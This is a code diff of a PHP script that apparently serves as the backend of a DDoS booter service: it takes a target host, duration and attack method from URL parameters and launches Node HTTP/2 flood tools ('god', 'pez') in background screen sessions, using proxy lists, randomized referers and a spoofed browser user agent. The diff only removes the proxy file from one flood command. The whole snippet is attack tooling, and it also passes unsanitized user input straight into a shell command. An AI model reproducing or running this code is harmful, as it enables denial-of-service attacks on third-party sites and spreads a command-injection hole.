@@ -22,7 +22,7 @@ if(isset($_GET['host'], $_GET['port'], $_GET['time'], $_GET['method'], $_GET['ke
 
     switch ($method) {
         case 'H2GOD':
-            $command = "cd /var/www/html/test/ && screen -dm node god $host $time 8 2 proxy.txt";
+            $command = "cd /var/www/html/test/ && screen -dm node god $host $time 8 2";
             break;
         case 'H2PEZ':
             $command = "cd /var/www/html/test/ && screen -dm node pez GET $host $time 4 64 proxy.txt --query 1 --bfm true --httpver 'http/1.1' --referer %RAND% --ua 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36' --ratelimit true";
